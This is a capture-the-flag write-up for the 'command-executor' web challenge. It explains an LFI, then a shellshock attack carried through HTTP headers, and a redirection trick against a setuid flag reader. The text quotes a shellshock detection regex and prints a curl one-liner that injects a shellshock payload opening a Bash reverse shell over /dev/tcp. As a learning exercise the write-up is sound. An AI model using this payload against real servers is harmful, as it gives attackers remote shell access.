# command-executor

Nice problem, I didn't solve the entire challenge, I read some hints from writeup.

The challenge has many small challenges, I think it's interesting.

First of all, we see the `ls` has some familiar name wrt the func param in the url. Func param supports man, untar, cmd and ls, and all of these files has `.php`! We may guess there's a LFI vulnerability.

```bash
bootstrap
cat-flag.png
cmd.php
comic-neue
index.nginx-debian.html
index.php
ls.php
man.php
untar.php
windows-run.jpg
```

Bingo! We can get the source code by classic base64 filter. After reading the source code, I have no idea. Traditional LFI to RCE won't work. After reading the writeup, this challenge is all about **shellshock**.

Hmm... is there any hints about shellshock that I didn't recognize, or it just needs guessing? Actually, yes! We can see there's a really weird regex in the blacklist `'\(\)\s*\{\s*:;\s*\};'`. If you're familiar with CVE in recent years, you may recognize this is a (weak) regex to detect shellshock.

Shellshock is a vulnerability in bash, which allows attacker to execute arbitrary code by setting environment variable. But how can we control the environment variable? Actually there's another strange code snippet about this

```php
foreach($_SERVER as $key => $val) {
    if(substr($key, 0, 5) === 'HTTP_') {
        putenv("$key=$val");
    }
}
```

Yes, we can actually control the environment variable by setting HTTP header! We'll try shellshock now.

After trying to modify the POC code, we got the RCE by the following POC. (I think reverse shell is more convenient)

```bash
curl -H "X: () { a:; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/host/port 0>&1'" https://command-executor.hackme.quest/index.php\?func\=cmd\&cmd\=env
```

The challenge is not done yet, the flag-reader program is not just a setuid reading flag program, it's still another challenge.

```c
#include <unistd.h>
#include <syscall.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char *argv[])
{
        char buff[4096], rnd[16], val[16];
        if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
                write(1, "Not enough random\n", 18);
        }

        setuid(1337);
        seteuid(1337);
        alarm(1);
        write(1, &rnd, sizeof(rnd));
        read(0, &val, sizeof(val));

        if(memcmp(rnd, val, sizeof(rnd)) == 0) {
                int fd = open(argv[1], O_RDONLY);
                if(fd > 0) {
                        int s = read(fd, buff, 1024);
                        if(s > 0) {
                                write(1, buff, s);
                        }
                        close(fd);
                } else {
                        write(1, "Can not open file\n", 18);
                }
        } else {
                write(1, "Wrong response\n", 16);
        }
}
```

We have to input the same random string to get the flag. Can we automate this?

If you're familiar with linux, it's not hard to find out to input and output the same file with `<` and `>`. We can find a place we're able to write and get the flag. I use `/dev/shm` here.

```bash
www-data@af32bfd60559:/$ rm /dev/shm/test
rm /dev/shm/test
www-data@af32bfd60559:/$ ./flag-reader > /dev/shm/test < /dev/shm/test flag
./flag-reader > /dev/shm/test < /dev/shm/test flag
www-data@af32bfd60559:/$ cat /dev/shm/test
cat /dev/shm/test
�5Q�;�;����B    ��FLAG{???}
```

Fun challenge, but I think it's a bit hard since we need to be sensitive to shellshock.

A little question here: can we use LFI to RCE?

My answer after some experiment is: no. Maybe I'm wrong, you can try it yourself and tell me if you find a way.

Since it uses `include("$page.php");`, we may come up with null byte termination to get rid of php extension. But it's not working.

Also using path and dot truncation won't work either.(Make path longer than 4096 bytes) So we cannot include anything we like.
